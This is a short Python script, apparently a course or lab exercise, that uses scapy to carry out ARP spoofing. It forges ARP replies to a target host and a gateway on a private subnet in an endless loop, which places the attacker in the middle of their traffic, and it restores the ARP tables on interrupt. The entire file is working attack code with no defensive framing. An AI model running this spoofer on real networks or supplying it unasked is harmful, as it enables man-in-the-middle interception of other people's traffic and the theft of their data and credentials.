#!/usr/bin/env python

# arp doesn't have verification protocol
import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # create arp packet object (class)
    broadcast_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # create ether net frame
    broadcast_arp_request = broadcast_request / arp_request
    answered_list = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]  # srp for custom packet

    return answered_list[0][1].hwsrc    # target's mac address


# create arp response
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)   # hardware(mac address) destination
    # source is us
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)  # hardware(mac address) destination

    scapy.send(packet, count=4, verbose=False)


target_ip = "10.0.2.5"
gateway_ip = "10.0.2.1"
try:
    sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_count += 2
        print("\r[+] Sent Packet Count: " + str(sent_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected Control + C. Restoring ARP table. Please wait...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

